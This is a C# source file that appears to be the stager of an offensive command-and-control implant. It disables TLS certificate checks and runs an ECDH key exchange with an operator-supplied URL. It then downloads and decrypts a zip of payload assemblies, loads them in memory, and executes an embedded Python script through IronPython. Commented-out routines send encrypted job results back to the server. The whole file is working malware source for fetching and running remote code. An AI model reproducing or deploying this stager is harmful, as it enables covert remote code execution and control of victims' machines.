using System;
using System.Threading;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Net;
using IronPython.Hosting;
using IronPython.Modules;
using Microsoft.Scripting.Hosting;
using System.Security.Cryptography;
using System.Text;
using System.Linq;
using System.Collections.Generic;
using System.Runtime.InteropServices;
//using Boo.Lang.Interpreter;
//using Boo.Lang.Compiler;
//using Boo.Lang.Compiler.IO;
//using Boo.Lang.Compiler.Pipelines;

[ComVisible(true)]
public class ST
{
    static Guid GUID = Guid.NewGuid();
    static Uri URL = null;
    static ZipArchive Stage = null;

    static ST()
    {
        ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
    }
    // https://mail.python.org/pipermail/ironpython-users/2012-December/016366.html
    // http://ironpython.net/blog/2012/07/07/whats-new-in-ironpython-273.html
    // https://blog.adamfurmanek.pl/2017/10/14/sqlxd-part-22/
    public static dynamic CreateEngine()
    {
        ScriptRuntimeSetup setup = Python.CreateRuntimeSetup(GetRuntimeOptions());
        var pyRuntime = new ScriptRuntime(setup);
        ScriptEngine engineInstance = Python.GetEngine(pyRuntime);

        AddPythonLibrariesToSysMetaPath(engineInstance);

        return engineInstance;
    }
    private static IDictionary<string, object> GetRuntimeOptions()
    {
        var options = new Dictionary<string, object>();
        options["Debug"] = false;
        return options;
    }
    public static void AddPythonLibrariesToSysMetaPath(ScriptEngine engineInstance)
    {
        Assembly asm = Assembly.GetExecutingAssembly().GetType().Assembly;
        try
        {
            var resQuery =
                from name in asm.GetManifestResourceNames()
                where name.ToLowerInvariant().EndsWith(".zip")
                select name;
            string resName = resQuery.Single();
#if DEBUG
            Console.WriteLine("Found embedded IPY stdlib : {0}", resName);
#endif
            var importer = new ResourceMetaPathImporter(asm, resName);
            dynamic sys = engineInstance.GetSysModule();
            sys.meta_path.append(importer);
            sys.path.append(importer);
            //List metaPath = sys.GetVariable("meta_path");
            //metaPath.Add(importer);
            //sys.SetVariable("meta_path", metaPath);
        }
        catch (Exception e)
        {
#if DEBUG
            Console.WriteLine("Did not find IPY stdlib in embedded resources: {0}", e.Message);
#endif
            return;
        }
    }

    public static Byte[] GetResourceInZip(ZipArchive zip, string resourceName)
    {
        foreach (var entry in zip.Entries)
        {
            if (entry.Name == resourceName)
            {
#if DEBUG
                Console.WriteLine("Found {0} in zip", resourceName);
#endif
                using (var resource = entry.Open())
                {
                    var resdata = new Byte[entry.Length];
                    resource.Read(resdata, 0, resdata.Length);
                    return resdata;
                }
            }
        }
        throw new Exception(String.Format("{0} not in zip file", resourceName));
    }
    public static byte[] AesDecrypt(byte[] data, byte[] key, byte[] iv)
    {
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.Padding = PaddingMode.PKCS7;
            aesAlg.KeySize = 256;
            aesAlg.Key = key;
            aesAlg.IV = iv;

            ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

            using (MemoryStream decryptedData = new MemoryStream())
            {
                using (CryptoStream cryptoStream = new CryptoStream(decryptedData, decryptor, CryptoStreamMode.Write))
                {
                    cryptoStream.Write(data, 0, data.Length);
                    cryptoStream.FlushFinalBlock();
                    return decryptedData.ToArray();
                }
            }
        }
    }
    public static byte[] AesEncrypt(byte[] data, byte[] key, byte[] iv)
    {
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.Padding = PaddingMode.PKCS7;
            aesAlg.KeySize = 256;
            aesAlg.Key = key;
            aesAlg.IV = iv;

            ICryptoTransform decryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

            using (MemoryStream encryptedData = new MemoryStream())
            {
                using (CryptoStream cryptoStream = new CryptoStream(encryptedData, decryptor, CryptoStreamMode.Write))
                {
                    cryptoStream.Write(data, 0, data.Length);
                    cryptoStream.FlushFinalBlock();
                    return encryptedData.ToArray();
                }
            }
        }
    }
    public static byte[] Encrypt(byte[] key, byte[] data)
    {
        IEnumerable<byte> blob = default(byte[]);

        using (RandomNumberGenerator rng = new RNGCryptoServiceProvider())
        {
            byte[] iv = new byte[16];
            rng.GetBytes(iv);

            byte[] encryptedData = AesEncrypt(data, key, iv);

            using (HMACSHA256 hmacsha256 = new HMACSHA256(key))
            {
                byte[] ivEncData = iv.Concat(encryptedData).ToArray();
                byte[] hmac = hmacsha256.ComputeHash(ivEncData);
                blob = ivEncData.Concat(hmac);
            }
        }
        return blob.ToArray();
    }
    public static byte[] Decrypt(byte[] key, byte[] data)
    {
        byte[] decryptedData = default(byte[]);

        byte[] iv = new byte[16];
        byte[] ciphertext = new byte[(data.Length - 32) - 16];
        byte[] hmac = new byte[32];

        Array.Copy(data, iv, 16);
        Array.Copy(data, data.Length - 32, hmac, 0, 32);
        Array.Copy(data, 16, ciphertext, 0, (data.Length - 32) - 16);

        using (HMACSHA256 hmacsha256 = new HMACSHA256(key))
        {
            byte[] computedHash = hmacsha256.ComputeHash(iv.Concat(ciphertext).ToArray());
            for (int i = 0; i < hmac.Length; i++)
            {
                if (computedHash[i] != hmac[i])
                {
                    Console.WriteLine("Invalid HMAC: {0}", i);
                    return decryptedData;
                }
            }
            decryptedData = AesDecrypt(ciphertext, key, iv);
        }
        return decryptedData;
    }
    public static byte[] HttpGet(Uri URL, string Endpoint = "")
    {
        Uri FullUrl = new Uri(URL, Endpoint);
#if DEBUG
        Console.WriteLine("Attempting HTTP GET to {0}", FullUrl);
#endif
        while (true)
        {
            try
            {
                using (var wc = new WebClient())
                {
                    byte[] data = wc.DownloadData(FullUrl);
#if DEBUG
                    Console.WriteLine("Downloaded {0} bytes", data.Length);
#endif              
                    return data;
                }
            }
            catch (Exception e)
            {
#if DEBUG
                Console.WriteLine("Error downloading {0}: {1}", FullUrl, e.Message);
#endif
                Thread.Sleep(5000);
            }
        }
    }
    public static byte[] HttpPost(Uri URL, string Endpoint = "", byte[] payload = default(byte[]))
    {
        Uri FullUrl = new Uri(URL, Endpoint);
#if DEBUG
        Console.WriteLine("Attempting HTTP POST to {0}", FullUrl);
#endif
        while (true)
        {
            try
            {
                var wr = WebRequest.Create(FullUrl);
                wr.Method = "POST";
                if (payload.Length > 0)
                {
                    wr.ContentType = "application/octet-stream";
                    wr.ContentLength = payload.Length;
                    var requestStream = wr.GetRequestStream();
                    requestStream.Write(payload, 0, payload.Length);
                    requestStream.Close();
                }
                var response = wr.GetResponse();
                using (MemoryStream memstream = new MemoryStream())
                {
                    response.GetResponseStream().CopyTo(memstream);
                    return memstream.ToArray();
                }
            }
            catch (Exception e)
            {
#if DEBUG
                Console.WriteLine("Error sending job results to {0}: {1}", FullUrl, e.Message);
#endif
                Thread.Sleep(5000);
            }
        }
    }
    public static byte[] ECDHKeyExchange(Uri URL, string Endpoint = "")
    {
        byte[] key = default(byte[]);

        using (ECDiffieHellmanCng AsymAlgo = new ECDiffieHellmanCng())
        {
            var publicKey = AsymAlgo.PublicKey.ToXmlString();
            byte[] r = HttpPost(URL, Endpoint, Encoding.UTF8.GetBytes(publicKey));

            ECDiffieHellmanCngPublicKey peerPublicKey = ECDiffieHellmanCngPublicKey.FromXmlString(Encoding.UTF8.GetString(r));
            key = AsymAlgo.DeriveKeyMaterial(peerPublicKey);
        }
        return key;
    }
    private static Assembly MyResolveEventHandler(object sender, ResolveEventArgs args)
    {
        var bytes = default(byte[]);
        string DllName = args.Name + ".dll";

        if (args.Name.IndexOf(',') > 0)
        {
            DllName = args.Name.Substring(0, args.Name.IndexOf(',')) + ".dll";
        }

        if (Stage == null)
        {
#if DEBUG
            Console.WriteLine("Trying to resolve assemblies by staging zip");
#endif
            byte[] key = ECDHKeyExchange(URL);
            byte[] encrypted_zip = HttpGet(URL);
            Stage = new ZipArchive(new MemoryStream(Decrypt(key, encrypted_zip)));
        }

        try
        {
            bytes = GetResourceInZip(Stage, DllName);
        }
        catch
        {
            bytes = File.ReadAllBytes(System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory() + DllName);
        }

        Assembly asm = Assembly.Load(bytes);
#if DEBUG
        Console.WriteLine("'{0}' loaded", asm.FullName);
#endif
        return asm;
    }
    public static void Main(string url)
    {

        try
        {
            URL = new Uri(new Uri(url), GUID.ToString());
        }
        catch { }

        AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(MyResolveEventHandler);

        Console.WriteLine("URL: {0}", URL);
        Console.WriteLine();
        /*
                byte[] key = ECDHKeyExchange(URL);
                byte[] decrypted_zip = Decrypt(key, HttpGet(URL));
                var stageZip = new ZipArchive(new MemoryStream(decrypted_zip));
        */

        RunIPYEngine();

        /*
               var job = GetResourceInZip(jobZip, "main.boo");
               //RunInBooEngine(Encoding.UTF8.GetString(job, 0, job.Length));
               RunInBooInterpreter(Encoding.UTF8.GetString(job, 0, job.Length));
       */

    }
    public static void RunIPYEngine()
    {
        var engine = CreateEngine();

        using (MemoryStream engineStream = new MemoryStream())
        {
            engine.Runtime.IO.SetOutput(engineStream, Encoding.UTF8);
            engine.Runtime.IO.SetErrorOutput(engineStream, Encoding.UTF8);

            if (Stage == null)
            {
                byte[] key = ECDHKeyExchange(URL);
                byte[] encrypted_zip = HttpGet(URL);
                Stage = new ZipArchive(new MemoryStream(Decrypt(key, encrypted_zip)));
            }

            var scope = engine.CreateScope();
            scope.SetVariable("URL", URL);
            //scope.SetVariable("ST", new ST());
            scope.SetVariable("GUID", GUID);
            //scope.SetVariable("CHANNEL", "http");
            scope.SetVariable("IronPythonDLL", Assembly.Load(GetResourceInZip(Stage, "IronPython.dll")));

#if DEBUG
            scope.SetVariable("DEBUG", true);
#elif RELEASE
            scope.SetVariable("DEBUG", false);
#endif

            //result = PythonOps.InitializeModuleEx(Assembly.Load(GetResourceInZip(stage, "Main.dll")), "__main__", null, false, null);

            byte[] mainPyFile = GetResourceInZip(Stage, "Main.py");
            engine.Execute(Encoding.UTF8.GetString(mainPyFile, 0, mainPyFile.Length), scope);

#if DEBUG
            if (engineStream.Length > 0)
            {
                Console.WriteLine(engineStream.ToString());
            }
#endif

        }

    }
    /*
        // https://github.com/boo-lang/boo/wiki/Scripting-with-the-Boo.Lang.Interpreter-API
        public static void RunInBooInterpreter(string job)
        {
            InteractiveInterpreter interpreter = new InteractiveInterpreter();
            interpreter.RememberLastValue = true;
            //interpreter.References.Add(Assembly.GetExecutingAssembly());

            interpreter.SetValue("URL", URL);
            interpreter.SetValue("Kukulkan", new KConsole());
    #if DEBUG
            interpreter.SetValue("DEBUG", true);
    #elif RELEASE
            interpreter.SetValue("DEBUG", false);
    #endif
            interpreter.Eval(job);

            string output = interpreter.LastValue.ToString();

            if (output != null && output.Length > 0)
            {
                byte[] key = ECDHKeyExchange(URL);
                byte[] encryptedResults = Encrypt(key, Encoding.UTF8.GetBytes(output));
                HttpPost(URL, "job", encryptedResults);
            }
        }
        public static void RunInBooEngine(string job)
        {
            //Console.WriteLine("Compiling...");

            BooCompiler compiler = new BooCompiler();
            compiler.Parameters.Input.Add(new StringInput("Boo", job));
            compiler.Parameters.Pipeline = new CompileToMemory();
            compiler.Parameters.Ducky = true;
            //Console.WriteLine(compiler.Parameters.LibPaths);
            //compiler.Parameters.LoadAssembly("System");

            CompilerContext context = compiler.Run();
            //Note that the following code might throw an error if the Boo script had bugs.
            //Poke context.Errors to make sure.
            if (context.GeneratedAssembly != null)
            {
                //Console.WriteLine("Executing...\n");
                Type scriptModule = context.GeneratedAssembly.GetType("BooModule");
                MethodInfo mainFunction = scriptModule.GetMethod("Entry");
    #if DEBUG
                string output = (string)mainFunction.Invoke(null, new object[] { new KConsole(), URL, true });
    #elif RELEASE
                string output = (string)mainFunction.Invoke(null, new object[] { new KConsole(), URL, false });
    #endif
                if (output != null && output.Length > 0)
                {
                    byte[] key = ECDHKeyExchange(URL);
                    byte[] encryptedResults = Encrypt(key, Encoding.UTF8.GetBytes(output));
                    HttpPost(URL, "job", encryptedResults);
                }
            }
            else
            {
                Console.WriteLine("Error(s) compiling script, this probably means your Boo script has bugs\n");
                foreach (CompilerError error in context.Errors)
                    Console.WriteLine(error);
            }
        }
    */
}